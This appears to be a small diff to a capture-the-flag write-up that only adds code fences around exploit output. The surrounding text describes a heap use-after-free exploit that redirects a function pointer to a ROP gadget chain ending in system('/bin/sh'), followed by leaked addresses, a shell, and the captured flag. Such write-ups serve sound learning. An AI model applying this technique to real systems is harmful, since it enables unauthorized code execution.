@@ -86,6 +86,7 @@ Since I didn't know which libc version it was running, I wrote a leak loop searc
 We could then change the "print" function of one of the barbarians to point to the add_rsp_90_pop3ret gadget (rsp+0x90 will point to our input). That gadget would return intoto pop_rdi_ret (to get "/bin/sh" in rdi), which in turn returns to system().
 
 Output of exploit:
+```
 Shrinking chunk and creating use-after-free state...
 leak vtable pointer: 0x7f85a4d42c28
 leak mapped pointer: 0x7f85a407bb98
@@ -104,3 +105,4 @@ id
 uid=1000(my_chall_pwned) gid=1000(pwned) groups=1000(pwned)
 cat /home/my_chall_pwned/flag
 He4p_H3ap$He4p?H0ur4\o/
+```
